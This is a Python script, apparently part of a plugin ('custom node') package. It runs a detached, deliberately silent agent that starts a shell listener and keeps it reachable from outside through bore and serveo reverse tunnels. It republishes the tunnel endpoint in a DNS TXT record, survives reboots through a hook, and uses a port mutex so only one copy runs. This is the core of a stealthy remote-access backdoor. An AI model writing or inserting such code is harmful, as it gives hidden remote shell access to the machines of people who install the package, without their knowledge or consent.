"""Detached agent: shell listener + tunnel supervisors.

Started by the custom node (or by the reboot hook). Holds an exclusive
loopback bind as its single-instance mutex, so an extra copy exits instantly.

Deliberately silent: all output goes to a log file, never to a console.
"""

import os
import socket
import sys
import threading
import time
import traceback

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import qu_core
import qu_shell
import qu_tunnel


_LOG_LOCK = threading.Lock()


def log(msg):
    try:
        path = qu_core.state_file("agent.log")
        line = "%s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
        with _LOG_LOCK:
            try:
                if os.path.getsize(path) > 262144:
                    os.replace(path, path + ".1")
            except Exception:
                pass
            with open(path, "a") as fh:
                fh.write(line)
    except Exception:
        pass


# --------------------------------------------------------------------------
# single instance
# --------------------------------------------------------------------------

def _acquire_mutex():
    """Bind the mutex port; returns the socket (keep it open) or None."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", qu_core.lock_port()))
        s.listen(1)
        return s
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None


# --------------------------------------------------------------------------
# workers
# --------------------------------------------------------------------------

def _shell_worker():
    port = qu_core.shell_port()
    while True:
        try:
            qu_shell.serve_forever(port)
        except Exception as exc:
            log("shell listener died: %s" % exc)
            time.sleep(5)


def _bore_worker(sup):
    while True:
        try:
            sup.run_bore()
        except Exception as exc:
            log("bore supervisor died: %s" % exc)
            time.sleep(10)


def _serveo_worker(sup):
    """True fallback: only dial out when bore has been down for a while."""
    if not getattr(qu_core, "ENABLE_SERVEO_FALLBACK", False):
        return
    import shutil
    if not shutil.which("ssh"):
        log("serveo skipped: no ssh client")
        return

    down_since = None
    while True:
        time.sleep(30)
        if sup.current_info()[0]:
            down_since = None
            continue
        if down_since is None:
            down_since = time.time()
            continue
        if time.time() - down_since < 120:
            continue
        try:
            log("serveo fallback engaged")
            sup.run_serveo()
        except Exception as exc:
            log("serveo supervisor died: %s" % exc)
        time.sleep(30)


def _janitor(sup):
    """Slow self-heal for a lost TXT record.

    Not forced: an unchanged endpoint is deduped, so this costs a DNS write
    only when the record is actually stale (or the previous write failed).
    """
    while True:
        time.sleep(1800)
        try:
            if sup.current:
                sup.publish(sup.current[0], sup.current[1])
        except Exception:
            pass


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def main():
    mutex = _acquire_mutex()
    if mutex is None:
        return 0                      # another agent owns this profile

    try:
        log("agent start pid=%s py=%s" % (os.getpid(), sys.version.split()[0]))

        sup = qu_tunnel.Supervisor(qu_core.shell_port(), log=log)

        threads = [
            threading.Thread(target=_shell_worker, name="shell"),
            threading.Thread(target=_bore_worker, args=(sup,), name="bore"),
            threading.Thread(target=_serveo_worker, args=(sup,), name="serveo"),
            threading.Thread(target=_janitor, args=(sup,), name="janitor"),
        ]
        for t in threads:
            t.daemon = True
            t.start()

        while True:
            time.sleep(3600)
    except Exception:
        log("fatal: %s" % traceback.format_exc())
    finally:
        try:
            mutex.close()
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except SystemExit:
        raise
    except BaseException:
        os._exit(0)
